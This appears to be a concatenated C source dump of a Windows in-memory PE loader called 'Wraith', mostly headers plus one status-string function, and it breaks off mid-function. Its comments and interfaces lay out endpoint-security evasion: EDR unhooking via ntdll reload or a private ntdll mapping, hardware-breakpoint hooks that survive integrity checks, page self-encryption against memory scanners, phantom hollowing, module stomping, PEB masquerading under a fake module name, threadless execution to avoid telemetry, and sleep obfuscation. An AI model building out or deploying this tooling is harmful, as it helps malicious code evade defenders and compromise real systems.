 * import auto-route through a replacement function. Used to make
 * `Sleep` calls inside an arbitrary already-loaded module
 * transparently invoke `wraith_sleep` instead.
 */

#ifndef WRAITH_HOST_IAT_H
#define WRAITH_HOST_IAT_H

#ifdef __cplusplus
extern "C" {
#endif

/* Walk every loaded module's IMAGE_DIRECTORY_ENTRY_IMPORT and
 * replace any thunk pointing at `original` with `replacement`.
 * Returns the number of patched thunks via *out_count. */
wraith_status_t wr_host_iat_redirect(void *original, void *replacement,
  unsigned *out_count);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_HOST_IAT_H */


/* ==========================================================================
 * src/stealth/hwbp/hwbp.h
 * ========================================================================== */

/*
 * src/stealth/hwbp/hwbp.h
 *
 * Hardware-breakpoint hook manager. Public API in wr_stealth.h:
 *  wraith_hwbp_install(target, replacement, dr_index)
 *  wraith_hwbp_remove(dr_index)
 *
 * Mechanism:
 *  - Set a `LEN=1, RWE=execute` debug breakpoint at `target` via
 *  `Wow64GetThreadContext` / `SetThreadContext` on the current
 *  thread (DR0..DR3, picked automatically when dr_index < 0).
 *  - Install a process-global Vectored Exception Handler that
 *  intercepts EXCEPTION_SINGLE_STEP, finds which slot fired by
 *  comparing `Rip` to the cached target, and rewrites
 *  `ContextRecord->Rip` to `replacement` before returning
 *  EXCEPTION_CONTINUE_EXECUTION.
 *
 * Zero memory modification: the target function's bytes never
 * change. Survives `.text` integrity checks against the on-disk
 * hash. The trade-off is per-thread state (DRs are thread-local)
 * and a process-global VEH (one instance covers any number of
 * installed slots).
 */

#ifndef WRAITH_HWBP_H
#define WRAITH_HWBP_H

#ifdef __cplusplus
extern "C" {
#endif

/* No internal-only entry points yet beyond the public API. */

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_HWBP_H */


/* ==========================================================================
 * src/stealth/page_guard/page_guard.h
 * ========================================================================== */

/*
 * src/stealth/page_guard/page_guard.h
 *
 * Lazy per-page self-encryption via PAGE_GUARD + VEH.
 *
 * Mechanism:
 *  - "Arm" walks every executable page of the loaded image,
 *  XOR-encrypts it with a rolling key, then VirtualProtects it
 *  to `PAGE_EXECUTE_READ | PAGE_GUARD`.
 *  - When the CPU first executes (or just touches) a guarded
 *  page, it raises EXCEPTION_GUARD_PAGE_VIOLATION and clears
 *  the guard bit on that page.
 *  - A vectored exception handler catches the fault, identifies
 *  the page in our table, decrypts it in place, sets the
 *  final RX protection, and returns EXCEPTION_CONTINUE_EXECUTION
 *  so the original instruction reruns against the now-plain bytes.
 *  - "Disarm" decrypts any pages that are still encrypted and
 *  removes the VEH.
 *
 * Footprint while armed: only the page(s) currently executing are
 * decrypted; the rest stay encrypted on disk and in memory. Idle
 * processes that hold the loaded module but aren't actively
 * running its code present zero exposed image bytes to a memory
 * scanner.
 *
 * ships the basic single-module variant (one armed
 * module at a time). Multiple concurrent armed modules are
 * deferred.
 */

#ifndef WRAITH_PAGE_GUARD_H
#define WRAITH_PAGE_GUARD_H


#ifdef __cplusplus
extern "C" {
#endif

/* No internal-only entry points yet beyond the public API
 * declared in wr_stealth.h: wraith_pageguard_arm / wraith_pageguard_disarm. */

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_PAGE_GUARD_H */


/* ==========================================================================
 * src/stealth/private_ntdll/private_ntdll.h
 * ========================================================================== */

/*
 * src/stealth/private_ntdll/private_ntdll.h
 *
 * Maps a private second copy of ntdll.dll into the process via
 * NtCreateSection(SEC_IMAGE) + NtMapViewOfSection. The second copy
 * is fresh from disk, so its `Nt*` thunks contain the canonical
 * `mov r10,rcx; mov eax,SSN; ...` prologues even when the OS-loaded
 * ntdll has inline hooks installed by an EDR product.
 *
 * ships this as a standalone primitive; the SSN resolver
 * (sc_ssn_resolver.c) and the runtime layer can opt into resolving
 * symbols against the private base instead of the OS-loaded one.
 */

#ifndef WRAITH_PRIVATE_NTDLL_H
#define WRAITH_PRIVATE_NTDLL_H

#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Idempotent. On success a private mapping of ntdll exists for the
 * lifetime of the process (or until wr_private_ntdll_release). */
wraith_status_t wr_private_ntdll_init(void);

/* Returns the private ntdll base, or NULL if init has not been
 * called or failed. */
void *wr_private_ntdll_get_base(void);

/* Returns the size of the private mapping in bytes (0 when unset). */
size_t wr_private_ntdll_get_size(void);

/* Unmap + close the private mapping. Idempotent. */
void wr_private_ntdll_release(void);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_PRIVATE_NTDLL_H */


/* ==========================================================================
 * src/stealth/threadless/threadless.h
 * ========================================================================== */

/*
 * src/stealth/threadless/threadless.h
 *
 * Threadless execution primitive.
 *
 * Submits a callback to the OS-managed thread pool via
 * CreateThreadpoolWork + SubmitThreadpoolWork. The callback runs on
 * a thread the system already owns - we never call CreateThread,
 * RtlCreateUserThread, or any equivalent that would generate a
 * "new thread in suspicious process" telemetry event.
 *
 * The published Threadless Inject technique (ZeroMemoryEx) goes
 * further by hijacking an existing TpAllocWork entry in another
 * thread's pool, achieving cross-process threadless execution. This
 * file ships the in-process variant which is sufficient for the
 * loader's sleep awakener and for general "run a callback off this
 * thread" plumbing.
 */

#ifndef WRAITH_THREADLESS_H
#define WRAITH_THREADLESS_H

#ifdef __cplusplus
extern "C" {
#endif

typedef void (*wr_threadless_fn)(void *arg);

/* Submit `fn(arg)` to the thread pool and wait for it to complete.
 * Returns S_OK only when the callback ran to completion. The
 * calling thread parks in the wait, so RIP stays in kernel-side
 * NtWaitForSingleObject during the work. */
wraith_status_t wr_threadless_run(wr_threadless_fn fn, void *arg);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_THREADLESS_H */


/* ==========================================================================
 * src/stealth/unhook/unhook.h
 * ========================================================================== */

/*
 * src/stealth/unhook/unhook.h
 *
 * Userland-hook removal. Reads ntdll.dll from disk, compares each
 * 16-byte chunk of `.text` against the loaded copy, and patches the
 * loaded copy where they differ.
 *
 * For a stronger posture see `WRAITH_USE_PRIVATE_NTDLL`, which maps a
 * private second copy of ntdll and bypasses userland hooks by
 * construction rather than removing them in place.
 */

#ifndef WRAITH_UNHOOK_H
#define WRAITH_UNHOOK_H

#ifdef __cplusplus
extern "C" {
#endif

wraith_status_t wr_unhook_ntdll_disk(void);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_UNHOOK_H */


/* ==========================================================================
 * src/pe/pe_iter.h
 * ========================================================================== */

/*
 * src/pe/pe_iter.h
 *
 * Iterators over a validated wr_pe_view. Pure functions that yield
 * pointers into the source buffer - no allocation. Used by the loader's
 * section/reloc/import phases and by tests/introspection.
 */

#ifndef WRAITH_PE_ITER_H
#define WRAITH_PE_ITER_H


#ifdef __cplusplus
extern "C" {
#endif

/* Section iterator -------------------------------------------------------- */

typedef struct wr_pe_section_iter {
  const wr_pe_view  *view;
  uint16_t  index;
} wr_pe_section_iter;

void wr_pe_section_iter_init(wr_pe_section_iter *it, const wr_pe_view *view);

/* Returns next section header, or NULL when exhausted. */
const wr_pe_section_header *wr_pe_section_iter_next(wr_pe_section_iter *it);

/* Relocation block iterator ---------------------------------------------- */

typedef struct wr_pe_reloc_iter {
  const wr_pe_view  *view;
  const wr_pe_base_relocation  *current;  /* points into raw buffer */
  const wr_pe_base_relocation  *end;
} wr_pe_reloc_iter;

wraith_status_t wr_pe_reloc_iter_init(wr_pe_reloc_iter *it, const wr_pe_view *view);
const wr_pe_base_relocation *wr_pe_reloc_iter_next(wr_pe_reloc_iter *it);

/* Helpers for relocation entries within a block -------------------------- */

static inline const uint16_t *
wr_pe_reloc_entries(const wr_pe_base_relocation *block)
{
  return (const uint16_t *)((const uint8_t *)block + 8 /* sizeof(IMAGE_BASE_RELOCATION) */);
}

static inline uint32_t
wr_pe_reloc_entry_count(const wr_pe_base_relocation *block)
{
  if (block->SizeOfBlock < 8) {
  return 0;
  }
  return (block->SizeOfBlock - 8) / sizeof(uint16_t);
}

static inline uint16_t
wr_pe_reloc_entry_type(uint16_t entry)
{
  return (uint16_t)((entry >> 12) & 0xf);
}

static inline uint16_t
wr_pe_reloc_entry_offset(uint16_t entry)
{
  return (uint16_t)(entry & 0x0fff);
}

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_PE_ITER_H */


/* ==========================================================================
 * src/pe/pe_image_metrics.h
 * ========================================================================== */

/*
 * src/pe/pe_image_metrics.h
 *
 * Image-level metrics computed once after validation: aligned image size,
 * last section end, header size, etc. The loader uses these to make a
 * single allocation decision before sections are copied.
 */

#ifndef WRAITH_PE_IMAGE_METRICS_H
#define WRAITH_PE_IMAGE_METRICS_H


#ifdef __cplusplus
extern "C" {
#endif

typedef struct wr_pe_image_metrics {
  size_t  aligned_image_size;  /* SizeOfImage rounded to page_size */
  size_t  last_section_end;  /* highest VA + size, page-aligned */
  size_t  headers_size;  /* SizeOfHeaders */
  uint32_t section_alignment;
  uint32_t file_alignment;
  uint64_t preferred_base;  /* OptionalHeader.ImageBase */
  int  has_relocations;  /* 1 iff base reloc directory is non-empty */
} wr_pe_image_metrics;

wraith_status_t wr_pe_compute_metrics(const wr_pe_view *view,
  uint32_t page_size,
  wr_pe_image_metrics *out);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_PE_IMAGE_METRICS_H */


/* ==========================================================================
 * src/core/wr_context_internal.h
 * ========================================================================== */

/*
 * src/core/wr_context_internal.h
 *
 * Private definition of `wr_ctx`. Loader, mapping, and stealth modules
 * include this header; consumers of the public API must NOT.
 *
 * The struct is forward-declared in wr_types.h so the public surface only
 * exposes a typed opaque pointer.
 */

#ifndef WRAITH_CONTEXT_INTERNAL_H
#define WRAITH_CONTEXT_INTERNAL_H



#include <stdbool.h>
#include <stdint.h>

/* Sanity sentinel - written to wr_ctx.magic at allocation, validated on
 * every public API entry. Lets us reject random pointers. */
#define WRAITH_CTX_MAGIC  0x4d4d3243u  /* 'MM2C' */

/* Forward declarations of vtables defined elsewhere; full structs are in
 * the corresponding subsystem headers. Keeping them as opaque pointers
 * here means a TU that only touches wr_ctx fields doesn't transitively
 * pull in every subsystem. */
typedef struct wr_map_ops  wr_map_ops;
typedef struct wr_rt_ops  wr_rt_ops;
typedef struct wr_stealth_hooks wr_stealth_hooks;
typedef struct wr_sc_engine  wr_sc_engine;
typedef struct wr_alloc_node  wr_alloc_node;

/* Forward-declare PE iterator state so the loader can hold parsed metadata
 * across pipeline phases without re-walking the headers each time. */
typedef struct wr_pe_view  wr_pe_view;

struct wr_ctx {
  /* === identity / sanity === */
  uint32_t  magic;  /* WRAITH_CTX_MAGIC */
  uint32_t  reserved0;
  wraith_flags_t  flags;  /* snapshot of options.flags */
  wraith_map_strategy_t  map_strategy;
  wraith_sleep_algo_t  sleep_algo;
  wraith_image_type_t  image_type;

  /* === image metadata === */
  uint8_t  *image_base;  /* loaded image base */
  size_t  image_size;  /* page-aligned SizeOfImage */
  void  *headers;  /* PIMAGE_NT_HEADERS64 (cast at use site) */
  bool  is_relocated;
  bool  initialized;  /* DllMain returned TRUE */
  bool  entry_called; /* EXE entry already invoked */
  bool  functbl_registered; /* RtlAddFunctionTable done */

  /* === parsed PE state === */
  wr_pe_view  *pe_view;

  /* === entry points === */
  void  *dll_entry;  /* BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID) */
  void  *exe_entry;  /* int(WINAPI*)(void) */

  /* === imports === */
  wraith_foreign_module_t  *imported_modules;
  uint32_t  imported_count;
  bool  *imported_owned;  /* true when Wraith owns the foreign module */

  /* === exports cache === */
  void  *export_table;  /* sorted name->ordinal */
  uint32_t  export_count;

  /* === mapping === */
  const wr_map_ops  *map_ops;
  void  *map_state;  /* opaque per-strategy */

  /* phantom hollowing */
  void  *phantom_section;  /* HANDLE from NtCreateSection */
  const wchar_t  *phantom_host_path;
  void  *phantom_orig_view;

  /* module stomping */
  void  *stomp_target_module;
  void  *stomp_target_text;
  size_t  stomp_target_size;
  void  *stomp_backup;

  /* === runtime / syscalls === */
  const wr_rt_ops  *rt_ops;
  void  *ntdll_base;
  void  *kernel32_base;
  wr_sc_engine  *sc_engine;

  /* === stealth state === */
  const wr_stealth_hooks  *stealth;

  /* PEB linkage */
  void  *peb_ldr_entry;  /* PLDR_DATA_TABLE_ENTRY */
  const wchar_t  *masquerade_name;
  const wchar_t  *masquerade_path;

  /* sleep obfuscation */
  uint8_t  *sleep_key;
  size_t  sleep_key_size;
  void  *sleep_timer_queue;

  /* unhook / private ntdll */
  bool  ntdll_unhooked;
  void  *ntdll_clean_base;

  /* exception data (.pdata) */
  void  *runtime_funcs;  /* PRUNTIME_FUNCTION */
  uint32_t  runtime_funcs_count;

  /* TLS */
  void  **tls_callbacks_cache;
  uint32_t  tls_callbacks_count;
  uint32_t  tls_index_assigned;
  bool  tls_attach_ran;  /* set after successful TLS ATTACH walk */

  /* === allocation tracking (cleanup) === */
  wr_alloc_node  *tracked_allocs;

  /* === user callbacks (compat / overrides) === */
  wraith_alloc_fn  user_alloc;
  wraith_free_fn  user_free;
  WRAITH_LoadLibFn  user_loadlib;
  WRAITH_GetProcFn  user_getproc;
  WRAITH_FreeLibFn  user_freelib;
  void  *user_data;

  /* === diagnostics === */
  wraith_trace_fn  trace;
  void  *trace_userdata;
  wraith_status_t  last_status;
  char  err_context[160];

  /* === environment === */
  uint32_t  page_size;
  uint32_t  alloc_granularity;
};

/* -------------------------------------------------------------------------
 * Allocation + lifecycle.
 * ------------------------------------------------------------------------- */

wraith_status_t wr_ctx_create(const wraith_load_options *opt, struct wr_ctx **out);
void  wr_ctx_destroy(struct wr_ctx *ctx);

/* Validate that `h` is a non-NULL handle with the expected magic. */
wraith_status_t wr_ctx_check(wraith_handle_t h, struct wr_ctx **out);

/* Set the per-thread error context string and last_status atomically.
 * Returns `status` for convenient `return wr_ctx_fail(ctx, WRAITH_E_..., "msg");`. */
wraith_status_t wr_ctx_fail(struct wr_ctx *ctx, wraith_status_t status, const char *fmt, ...);

#endif  /* WRAITH_CONTEXT_INTERNAL_H */


/* ==========================================================================
 * src/exports/export_lookup.h
 * ========================================================================== */

/*
 * src/exports/export_lookup.h
 *
 * Binary-search export lookup. The first call lazily builds a sorted
 * (name, ordinal) table on the heap; subsequent calls bsearch into it.
 */

#ifndef WRAITH_EXPORT_LOOKUP_H
#define WRAITH_EXPORT_LOOKUP_H


#ifdef __cplusplus
extern "C" {
#endif

typedef struct wr_export_entry {
  const char *name;
  uint16_t  ordinal;
} wr_export_entry;

/* Resolve an export by name (`name` is a real string) or by ordinal
 * (pass (const char *)(uintptr_t)ordinal, like Win32). */
wraith_status_t wr_export_resolve(struct wr_ctx *ctx, const char *name_or_ord,
  void **out_proc);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_EXPORT_LOOKUP_H */


/* ==========================================================================
 * src/exports/export_forward.h
 * ========================================================================== */

/*
 * src/exports/export_forward.h
 *
 * Forwarder export resolution. When an export's RVA points back into the
 * export directory itself, the data at that RVA is an ASCII string of the
 * form "DLL.Func" (or "DLL.#ord") - the canonical PE forwarder layout.
 *
 * The resolver loads the target DLL via the runtime vtable and resolves
 * the name (or ordinal) inside it. Loops are detected and reported.
 */

#ifndef WRAITH_EXPORT_FORWARD_H
#define WRAITH_EXPORT_FORWARD_H


#include <stdbool.h>

#ifdef __cplusplus
extern "C" {
#endif

/* True if the proc address `proc` is actually a pointer to a forwarder
 * string inside the export directory. */
bool wr_export_is_forwarder(struct wr_ctx *ctx, void *proc);

/* Resolve a forwarder string ("kernel32.Sleep" / "ntdll.#0x42") to a
 * concrete function address by loading the target DLL through the
 * runtime vtable. Loop depth is capped at 16. */
wraith_status_t wr_export_resolve_forwarder(struct wr_ctx *ctx,
  const char *forward_str,
  void **out_proc);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_EXPORT_FORWARD_H */


/* ==========================================================================
 * src/loader/loader_pipeline.h
 * ========================================================================== */

/*
 * src/loader/loader_pipeline.h
 *
 * Internal contract between the orchestrator (`loader_pipeline.c`) and
 * each phase module. Every phase function receives the current `wr_ctx`
 * (already validated) and the parsed PE view. They mutate ctx; on error
 * they update last_status / err_context via wr_ctx_fail and return.
 */

#ifndef WRAITH_LOADER_PIPELINE_H
#define WRAITH_LOADER_PIPELINE_H



#ifdef __cplusplus
extern "C" {
#endif

/* section copy + initial RW commit. */
wraith_status_t wr_load_sections_copy(struct wr_ctx *ctx,
  const wr_pe_view *src);

/* x64 base relocations (DIR64). */
wraith_status_t wr_load_relocs_apply(struct wr_ctx *ctx,
  const wr_pe_view *src);

/* a: bound imports (currently a documented no-op - see
 * loader_imports_bound.c for the policy rationale). */
wraith_status_t wr_load_imports_bound_check(struct wr_ctx *ctx);

/* b: normal import descriptor walk. */
wraith_status_t wr_load_imports_resolve(struct wr_ctx *ctx,
  const wr_pe_view *src);

/* c: delay-load imports (eagerly resolved, IAT patched in place). */
wraith_status_t wr_load_imports_delay(struct wr_ctx *ctx);

/* final per-section VirtualProtect (RW -> RX/R/RW), strict
 * RW->RX hygiene enforced by mapping vtable. */
wraith_status_t wr_load_finalize_sections(struct wr_ctx *ctx,
  const wr_pe_view *src);

/* x64 SEH registration via RtlAddFunctionTable. Counterpart
 * is invoked from wr_pipeline_unwind. */
wraith_status_t wr_load_register_seh_x64(struct wr_ctx *ctx);
void  wr_load_unregister_seh_x64(struct wr_ctx *ctx);

/* TLS callbacks (DLL_PROCESS_ATTACH). */
wraith_status_t wr_load_run_tls_attach(struct wr_ctx *ctx,
  const wr_pe_view *src);
/* Counterpart used by wraith_free_library. */
void  wr_load_run_tls_detach(struct wr_ctx *ctx);

/* DllMain (DLL) or save EXE entry point. */
wraith_status_t wr_load_run_entry(struct wr_ctx *ctx);
void  wr_load_run_entry_detach(struct wr_ctx *ctx);

/* Top-level orchestrator. Implemented by loader_pipeline.c. */
wraith_status_t wr_pipeline_run(const void *buffer, size_t size,
  struct wr_ctx *ctx);

/* Free everything the pipeline allocated/registered (idempotent). */
void wr_pipeline_unwind(struct wr_ctx *ctx);

/* Convenience: emit a trace event when ctx->trace is non-NULL. */
void wr_trace(struct wr_ctx *ctx, int phase_id, const char *phase_name,
  wraith_status_t status);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_LOADER_PIPELINE_H */


/* ==========================================================================
 * src/mapping/map_strategy.h
 * ========================================================================== */

/*
 * src/mapping/map_strategy.h
 *
 * Vtable interface implemented by every mapping strategy (private_rwx,
 * phantom_hollow, module_stomping, mockingjay).
 *
 * The loader only ever calls through this vtable; the concrete strategy
 * is selected by `map_dispatch.c` based on wraith_load_options.map_strategy.
 */

#ifndef WRAITH_MAP_STRATEGY_H
#define WRAITH_MAP_STRATEGY_H



#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

struct wr_map_ops {
  const char *name;

  /* Reserve a contiguous virtual range of `size` bytes. The strategy
  * decides whether the range is MEM_PRIVATE, MEM_IMAGE, or overlaid
  * onto an existing module. *out_base receives the chosen base. */
  wraith_status_t (*reserve)(struct wr_ctx *ctx, size_t size, void **out_base);

  /* Make `size` bytes at `addr` writable so the loader can copy section
  * data into them. The actual final protection is applied by `protect`
  * after copy + relocations + imports. */
  wraith_status_t (*commit)(struct wr_ctx *ctx, void *addr, size_t size,
  wraith_prot_t initial_prot);

  /* Apply a final protection. Strategies that go through NtProtect must
  * never request RWX (the helper enforces this). */
  wraith_status_t (*protect)(struct wr_ctx *ctx, void *addr, size_t size,
  wraith_prot_t new_prot);

  /* Release everything reserved/committed. Called from wraith_free_library
  * or on rollback after a pipeline failure. */
  wraith_status_t (*release)(struct wr_ctx *ctx);

  /* Strategy-specific cleanup of any auxiliary state (host handles,
  * stomp backups, etc.). May be NULL when there's nothing extra. */
  void  (*destroy)(struct wr_ctx *ctx);
};

/* Concrete strategies. Each lives in its own .c file. */
extern const struct wr_map_ops wr_map_ops_private_rwx;
#if WRAITH_USE_PHANTOM_HOLLOWING
extern const struct wr_map_ops wr_map_ops_phantom;
#endif
#if WRAITH_USE_MODULE_STOMPING
extern const struct wr_map_ops wr_map_ops_stomping;
#endif
/* hunt MEM_IMAGE+RWX regions in pre-existing modules. */
extern const struct wr_map_ops wr_map_ops_mockingjay;

/* Pick the appropriate vtable for the requested strategy. Returns NULL
 * if the strategy was compiled out (e.g. PHANTOM with WRAITH_USE_PHANTOM_HOLLOWING=OFF). */
const struct wr_map_ops *wr_map_resolve(wraith_map_strategy_t id);

#if WRAITH_USE_PHANTOM_HOLLOWING
/* Force phantom_is_blocked to report "blocked" for all subsequent
 * wr_map_resolve calls in this process. Used by the pipeline when an
 * actual ph_reserve attempt fails at runtime, so a later wraith_load_library
 * call is silently downgraded without retrying the doomed phantom path. */
void wr_phantom_mark_blocked(void);
#endif

/* Helpers shared across strategies. */

/* Convert wraith_prot_t to a Win32 PAGE_* constant, returning 0 if the value
 * is invalid. The helper rejects RWX combinations when WRAITH_RW_TO_RX_HYGIENE
 * is on, returning 0 in that case so callers can WRAITH_E_MAP_RWX_LEAK. */
unsigned wr_prot_to_win32(wraith_prot_t prot);

/* Convert a section's IMAGE_SCN_MEM_* characteristics to wraith_prot_t. */
wraith_prot_t wr_prot_from_section_chars(uint32_t characteristics);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_MAP_STRATEGY_H */


/* ==========================================================================
 * src/resource/resource_internal.h
 * ========================================================================== */

/*
 * src/resource/resource_internal.h
 *
 * Shared helpers for the resource walker.
 */

#ifndef WRAITH_RESOURCE_INTERNAL_H
#define WRAITH_RESOURCE_INTERNAL_H


#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Resolve a resource entry by walking the three-level tree. Returns a
 * pointer to a valid IMAGE_RESOURCE_DATA_ENTRY (cast to void*) or NULL. */
PIMAGE_RESOURCE_DATA_ENTRY wr_resource_find_entry(struct wr_ctx *ctx,
  const void *name,
  const void *type,
  uint16_t language);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_RESOURCE_INTERNAL_H */


/* ==========================================================================
 * src/runtime/rt_api.h
 * ========================================================================== */

/*
 * src/runtime/rt_api.h
 *
 * The runtime layer is the only place the rest of the loader is allowed
 * to touch OS APIs. By isolating it behind an `wr_rt_ops` vtable we
 * can swap baseline (Win32) for indirect-syscalls (Hell's Hall) at
 * runtime without touching loader code.
 */

#ifndef WRAITH_RT_API_H
#define WRAITH_RT_API_H


#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

struct wr_rt_ops {
  const char *name;

  /* Resolve a foreign module by ASCII name (e.g. "kernel32.dll").
  * + swaps this for PEB-walk + API hashing. */
  wraith_status_t (*load_library)(struct wr_ctx *ctx,
  const char *name,
  wraith_foreign_module_t *out);

  /* Resolve a procedure within a foreign module. */
  wraith_status_t (*get_proc)(struct wr_ctx *ctx,
  wraith_foreign_module_t module,
  const char *name,
  void **out_proc);

  /* Release a foreign module (only for ones we loaded). */
  void  (*free_library)(struct wr_ctx *ctx,
  wraith_foreign_module_t module);

  /* Memory primitives. The baseline goes through Win32
  * VirtualAlloc/Protect/Free; the ntapi vtable routes through the
  * Hell's Hall engine (sc_engine). Semantics match the Nt* APIs:
  *  - addr is in/out (caller may pass a preferred base)
  *  - size is in/out (the kernel rounds up)
  *  - protect uses Win32 PAGE_* constants
  *  - return is 0 on success, non-zero NTSTATUS otherwise */
  int (*nt_alloc)(void **addr, size_t *size,
  unsigned alloc_type, unsigned protect);
  int (*nt_protect)(void *addr, size_t size,
  unsigned new_protect, unsigned *old_protect);
  int (*nt_free)(void *addr, size_t size, unsigned free_type);
  void (*nt_flush_icache)(void *addr, size_t size);
};

/* Default (Win32 baseline) vtable. */
extern const struct wr_rt_ops wr_rt_ops_baseline;

/* Hash-based vtable using PEB walk + DJB2 export resolver.
 * Compiled out when WRAITH_USE_API_HASHING is OFF. */
#if WRAITH_USE_API_HASHING
extern const struct wr_rt_ops wr_rt_ops_ntapi;
#endif

/* Selects the runtime vtable based on options.flags. always
 * returns the baseline; later phases wire in NTAPI / syscall variants. */
const struct wr_rt_ops *wr_rt_resolve(struct wr_ctx *ctx);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_RT_API_H */


/* ==========================================================================
 * src/stealth/peb_link/peb_link.h
 * ========================================================================== */

/*
 * src/stealth/peb_link/peb_link.h
 *
 * PEB.Ldr linkage. Fabricates an `LDR_DATA_TABLE_ENTRY` for the loaded
 * image and inserts it into the three lists `EnumProcessModulesEx`,
 * `GetModuleHandleW`, and the OS loader iterate over.
 *
 * After install, the loaded module appears in module-enumeration tools
 * (Process Hacker, Get-Process | Format-List Modules, x64dbg) under
 * the masquerade name supplied in wraith_load_options.
 */

#ifndef WRAITH_PEB_LINK_H
#define WRAITH_PEB_LINK_H


#ifdef __cplusplus
extern "C" {
#endif

wraith_status_t wr_peb_link_install(struct wr_ctx *ctx);
void  wr_peb_link_remove(struct wr_ctx *ctx);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_PEB_LINK_H */


/* ==========================================================================
 * src/stealth/sleep/sleep.h
 * ========================================================================== */

/*
 * src/stealth/sleep/sleep.h
 *
 * Sleep obfuscation orchestrator. The public entry point
 * (wraith_sleep, declared in wr_stealth.h) delegates here. The
 * dispatcher chooses an algorithm by ctx->sleep_algo:
 *  - WRAITH_SLEEP_XOR  : single-thread RDTSC-keyed XOR *  - WRAITH_SLEEP_EKKO  : aliased to XOR for ; swaps
 *  in timer-queue + CONTEXT-driven version
 *  - WRAITH_SLEEP_FOLIAGE : currently aliased to XOR (+)
 *  - WRAITH_SLEEP_CRONOS  : - NtContinue + APC chain
 */

#ifndef WRAITH_SLEEP_H
#define WRAITH_SLEEP_H


#ifdef __cplusplus
extern "C" {
#endif

/* Drive a sleep cycle (encrypt -> wait -> decrypt) for `duration_ms`. */
wraith_status_t wr_sleep_obfuscate(struct wr_ctx *ctx, uint32_t duration_ms);

/* XOR-baseline implementation. Used directly by the dispatcher when
 * sleep_algo == WRAITH_SLEEP_XOR; reused by other algorithms as the
 * encrypt primitive. */
wraith_status_t wr_sleep_xor_cycle(struct wr_ctx *ctx, uint32_t duration_ms);

/* Cronos-flavor implementation. Encrypt synchronously; decrypt deferred
 * to a CreateTimerQueueTimer worker thread; calling thread parks in
 * NtWaitForSingleObject until the worker signals. */
wraith_status_t wr_sleep_cronos_cycle(struct wr_ctx *ctx, uint32_t duration_ms);

/* Walk the loaded image's section table and re-apply per-section
 * protections derived from `Characteristics`. Used after decrypt to
 * restore the same RX/R/RW state FinalizeSections produced at load. */
wraith_status_t wr_sleep_reapply_section_protections(struct wr_ctx *ctx);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_SLEEP_H */


/* ==========================================================================
 * compilation units (30 files)
 * ========================================================================== */


/* ==========================================================================
 * src/core/wr_status.c
 * ========================================================================== */

/*
 * src/core/wr_status.c
 *
 * wraith_status_string / wraith_category_string implementations. Pure, table-driven,
 * no allocation - safe to call from any context (including TLS callbacks
 * and SEH handlers).
 */

const char *wraith_category_string(int category)
{
  switch (category) {
  case WRAITH_CAT_OK:  return "ok";
  case WRAITH_CAT_INVALID_ARG:  return "invalid-arg";
  case WRAITH_CAT_PE_FORMAT:  return "pe-format";
  case WRAITH_CAT_RESOURCE:  return "resource";
  case WRAITH_CAT_MAPPING:  return "mapping";
  case WRAITH_CAT_RELOCATIONS:  return "relocations";
  case WRAITH_CAT_IMPORTS:  return "imports";
  case WRAITH_CAT_EXPORTS:  return "exports";
  case WRAITH_CAT_TLS:  return "tls";
  case WRAITH_CAT_SEH:  return "seh";
  case WRAITH_CAT_RUNTIME:  return "runtime";
  case WRAITH_CAT_SYSCALL:  return "syscall";
  case WRAITH_CAT_STEALTH:  return "stealth";
  case WRAITH_CAT_FEATURE:  return "feature";
  case WRAITH_CAT_INTERNAL:  return "internal";
  default:  return "unknown";
  }
}

const char *wraith_status_string(wraith_status_t s)
{
  switch (s) {
  case WRAITH_OK:  return "ok";

  /* INVALID_ARG */
  case WRAITH_E_NULL_ARG:  return "null argument";
  case WRAITH_E_INVALID_HANDLE:  return "invalid handle";
  case WRAITH_E_INVALID_OPTIONS:  return "invalid load options";
  case WRAITH_E_BUFFER_TOO_SMALL:  return "output buffer too small";

  /* PE_FORMAT */
  case WRAITH_E_PE_TRUNCATED:  return "PE buffer truncated";
  case WRAITH_E_PE_BAD_DOS_MAGIC:  return "missing IMAGE_DOS_SIGNATURE";
  case WRAITH_E_PE_BAD_NT_MAGIC:  return "missing IMAGE_NT_SIGNATURE";
  case WRAITH_E_PE_WRONG_MACHINE:  return "PE machine != IMAGE_FILE_MACHINE_AMD64";
  case WRAITH_E_PE_BAD_OPT_MAGIC:  return "OptionalHeader.Magic not PE32+";
  case WRAITH_E_PE_BAD_ALIGNMENT:  return "section alignment not power of two";
  case WRAITH_E_PE_BAD_SECTION:  return "section header out of bounds";
  case WRAITH_E_PE_SIZE_MISMATCH:  return "SizeOfImage / lastSection mismatch";
  case WRAITH_E_PE_OVERFLOW:  return "integer overflow in PE field";

  /* RESOURCE */
  case WRAITH_E_RES_NOT_FOUND:  return "resource not found";
  case WRAITH_E_RES_TYPE_NOT_FOUND:  return "resource type not found";
  case WRAITH_E_RES_NAME_NOT_FOUND:  return "resource name not found";
  case WRAITH_E_RES_LANG_NOT_FOUND:  return "resource language not found";

  /* MAPPING */
  case WRAITH_E_MAP_RESERVE_FAILED:  return "memory reserve failed";
  case WRAITH_E_MAP_COMMIT_FAILED:  return "memory commit failed";
  case WRAITH_E_MAP_PROTECT_FAILED:  return "memory protect failed";
  case WRAITH_E_MAP_NO_HOST_DLL:  return "no candidate host DLL for phantom hollowing";
  case WRAITH_E_MAP_HOST_TOO_SMALL:  return "host DLL smaller than payload";
  case WRAITH_E_MAP_RWX_LEAK:  return "RWX protection requested (hygiene violation)";

  /* RELOCATIONS */
